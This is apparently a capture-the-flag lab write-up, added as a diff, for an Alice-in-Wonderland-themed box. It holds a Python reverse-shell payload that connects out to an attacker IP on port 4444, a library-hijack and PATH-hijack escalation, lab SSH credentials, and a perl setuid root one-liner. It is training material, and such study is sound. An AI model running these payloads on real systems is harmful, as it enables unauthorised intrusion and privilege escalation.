@@ -1,0 +1,102 @@
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /r/: Potentially interesting folder
+|_  /img/: Potentially interesting folder
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+MAC Address: 02:6D:0F:64:59:5D (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+/r/ - is a hint
+we know that's target is a ubuntu operating system
+and site on golang
+
+Steghide is a cool and strange tool working with 'passphrases'
+it help to get stego from image
+steghide extract -sf white-rabbit_1.jpg
+I got hint
+
+
+sooo..
+if you enter ip/r/a/b/b/i/t you get the same site but img with Alice?
+
+Text has other names:
+Hatter and March Hare
+
+
+In rabbit site
+there is a comment alice:HowDothTheLittleCrocodileImproveHisShiningTail
+its ssh login and password
+there 2 files root.txt and walrus_and_carpenter.py
+which we can run as rabbit 
+
+
+i found that we can abuse python libraries
+i wrote this to random.py to abuse library:
+
+import os, subprocess, socket
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.22.64",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
+
+so.. im trying to get reverse shell via:
+sudo -u rabbit python3 walrus_and_carpenter.py
+
+i find out that we should give the same path that sudo -l gived as
+(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+So:
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+and it works!
+
+using ltrace and strace i found that:
+it uses 
+/etc/suid-debug 
+/bin/echo -n 
+
+text:
+Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)
+
+more interesting is date function
+we overide it with $PATH
+
+
+i inserted rabbit's home directory into $PATH
+and
+echo "/bin/bash" > date
+./teaParty
+There was lags but i used
+bash -i
+and got stable shell
+i found password.txt
+it has:
+WhyIsARavenLikeAWritingDesk?
+
+LINPEAS:
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep 
+
+[+] Users with capabilities
+
+[+] Files with ACLs
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+/usr/bin/gettext.sh
+
+got from GTFobins capabilities:
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+i got root 
+/root/user.txt
+/home/alice/root.txt
+
